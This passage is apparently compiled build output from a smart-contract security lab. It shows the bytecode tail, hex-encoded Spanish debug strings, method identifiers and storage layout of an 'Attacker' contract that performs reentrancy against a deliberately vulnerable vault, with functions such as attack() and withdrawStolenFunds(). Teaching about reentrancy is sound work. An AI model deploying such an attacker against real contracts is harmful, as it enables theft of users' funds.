\"#utility.yul\":2573:2757   */\n      swap1\n      pop\n      jump\t// out\n    stop\n    data_4dd9b442acf3e8cc560e1a32f9bcf3c7d0c097a5052e406aee2fd0e831e11b08 2020202d204c4c414d414e444f206465706f7369742829204e554556414d454e544521\n    data_885d769aa29e598a69ca240c30da87d65d1286fd28a69b8127485636d377220a 425245414b504f494e542041545441434b4552202d204578706c6f74616e646f206465706f73697420626f6e75733a\n    data_895220160cc01848bad383f1fe3fa26171c49796af7f42ec0ab7a1191b347ff4 2020202d204c4c414d414e444f2077697468647261772829204e554556414d454e544521\n    data_8c119e9453b9fe84e944a38959af375701bf93bd8a15c877916db9b641e7155a 425245414b504f494e542041545441434b4552202d20446573707565732064652061637475616c697a617220636f6e7461646f7265733a\n    data_ac05c166d7c8ee919979307f9e5f597c4c1ca7971eb055eb1e9527482fcaaf76 425245414b504f494e542041545441434b4552202d2052656365697665206c6c616d61646f3a\n    data_dcf3f909ab2f47b955f8e92e4b9bee76e86a2c77f21a1daae57900c890cf7e3e 425245414b504f494e542041545441434b4552202d20456a65637574616e646f207265656e7472616e63793a\n\n    auxdata: 0xa26469706673582212209f3a064e423b25715573ab118b4e82e053b7eb10edb24e630d811c2710fa520664736f6c63430008140033\n}\n","methodIdentifiers":{"attack()":"9e5faafc","attackCount()":"407c2821","attackDepositBonus()":"50a63df1","attackEmergencyWithdraw()":"7dd0ddf9","getAttackStats()":"0777586a","getVaultBalance()":"ed12e8ef","getVaultUserBalance()":"1f22e4b3","totalStolen()":"d9f9d5f2","vault()":"fbfa77cf","withdrawStolenFunds()":"fd276754"},"storageLayout":{"storage":[{"astId":40803,"contract":"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol:Attacker","label":"vault","offset":0,"slot":"0","type":"t_contract(VulnerableVault)41622"},{"astId":40806,"contract":"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol:Attacker","label":"attackCount","offset":0,"slot":"1","type":"t_uint256"},{"astId":40809,"contract":"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol:Attacker","label":"totalStolen","offset":0,"slot":"2","type":"t_uint256"}],"types":{"t_contract(VulnerableVault)41622":{"encoding":"inplace","label":"contract VulnerableVault","numberOfBytes":"20"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"id":25}